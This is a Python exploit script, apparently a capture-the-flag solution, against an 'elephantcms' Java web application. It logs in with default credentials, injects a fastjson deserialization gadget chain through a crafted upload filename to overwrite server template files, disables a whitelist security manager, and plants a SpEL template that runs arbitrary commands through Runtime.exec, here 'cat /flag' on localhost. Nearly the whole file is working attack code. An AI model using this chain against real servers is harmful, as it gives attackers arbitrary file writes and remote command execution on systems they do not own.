import requests
import time
import os

def CreateBody(filename, fieldname, strBoundary,exp):
    bRet = False
    sData = []
    sData.append('--%s' % strBoundary)
    evil_fname='file",%s,"a":".txt'%(exp)
    # print(evil_fname)
    sData.append('Content-Disposition: form-data; name="%s";' % fieldname + 'filename=%s' % evil_fname)
    sData.append('Content-Type: %s\r\n' % 'application/octet-stream')
 
    try:
        pFile = open(filename, 'rb')
        sData.append(str(pFile.read()))
        sData.append('--%s--\r\n' % strBoundary)
        bRet = True
    finally:
        pFile.close()
            
    return bRet, sData
 
def uploadfile(http_url, filename, fieldname,exp):        
    if os.path.exists(filename):
        filesize = os.path.getsize(filename)
        # print('file:' + filename + ' is %d bytes!' % filesize)
    else:
        # print('file:' + filename + ' isn\'t exists!')
        return False
    
    strBoundary = '---------------------------%s' % hex(int(time.time() * 1000))
    bRet, sBodyData = CreateBody(filename, fieldname, strBoundary,exp)
    if True == bRet:
        http_body = '\r\n'.join(sBodyData)
        headers = {
            "User-Agent":"Mozilla/5.0",
            "Content-Length":'%d' % filesize,
            "Content-Type":'multipart/form-data; boundary=%s' % strBoundary,
        }
        response = session.post(http_url,data=http_body,headers=headers)
        # get response
        msg = response.text
        # print("Response content:\n" + msg)
    else:
        print("CreateBody failed!")
        
    return bRet

def login():
    data={
        "username": "admin",
        "password": "admin"
    }
    r = session.post(url=url,data=data)

def fill(evil):
    while len(evil)<=8192:
        evil = evil + " "
    assert len(evil)>8192
    return evil

def attack(command):
    #test.btl absolutely path
    #first attack rewrite the whitelist restriction.
    path="/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/test.btl"
    evil = fill("${@venom.elephantcms.common.WhiteListNativeSecurityManager.test('org.springframework,java.beans,venom.elephantcms')}")

    uploadfile(url+"/upload?action=uploadfile","vul.txt","123",'{"x":{"@type":"com.alibaba.fastjson.JSONObject","input":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""'+evil+'","start":0,"end":2147483647},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"'+path+'","charsetName":"US-ASCII","append":false},"charset":"UTF-8","bufferSize":1024,"writeImmediately":true},"trigger":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger2":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger3":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"}}')
    time.sleep(2)
    r = session.get(url+"/flag")
    if 'ok' in r.text:
        print('Successfully rewrite the whitelist')
    else:
        exit('oops')
    #second attack getshell.
    path="/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/upload.btl"
    evil = fill("${@java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()}")
    uploadfile(url+"/upload?action=uploadfile","vul.txt","123",'{"x":{"@type":"com.alibaba.fastjson.JSONObject","input":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""'+evil+'","start":0,"end":2147483647},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"'+path+'","charsetName":"US-ASCII","append":false},"charset":"UTF-8","bufferSize":1024,"writeImmediately":true},"trigger":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger2":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger3":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"}}')
    time.sleep(2)
    r = session.get(url+f"/upload?a=org.springframework.expression.spel.standard.SpelExpressionParser&b=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{command}').getInputStream()).next()")
    print(r.text.strip())
    #second attack rce

session = requests.session()
if __name__ == "__main__":
    # url= "http://localhost:8080"
    url = "http://localhost:10800"
    command='cat /flag'
    login()
    time.sleep(1)
    attack(command)